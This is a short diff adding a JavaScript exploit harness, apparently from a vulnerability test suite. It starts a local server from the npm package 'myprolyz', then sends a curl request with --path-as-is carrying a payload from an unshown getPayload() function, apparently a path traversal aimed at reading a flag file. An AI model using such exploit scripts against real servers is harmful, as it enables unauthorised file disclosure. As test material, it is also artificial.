@@ -1,0 +1,26 @@
+function exploitFunction() {
+  const path = require("path");
+  const { sleep } = require("sleep");
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+
+  afterAll(() => {
+    try {
+      execSync("fuser -k 8889/tcp");
+    } catch (e) {}
+  });
+
+  const server = "node ./node_modules/myprolyz/index.js";
+  let exe = exec(server, (error, stdout) => {});
+
+  sleep.sleep(2);
+
+  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8889${getPayload()}"`;
+  exec(attack_string, (error, stdout) => {
+    if (stdout) {
+      return stdout;
+    }
+    throw new Error("No output received from the server");
+  });
+}
+
+module.exports = { exploitFunction };
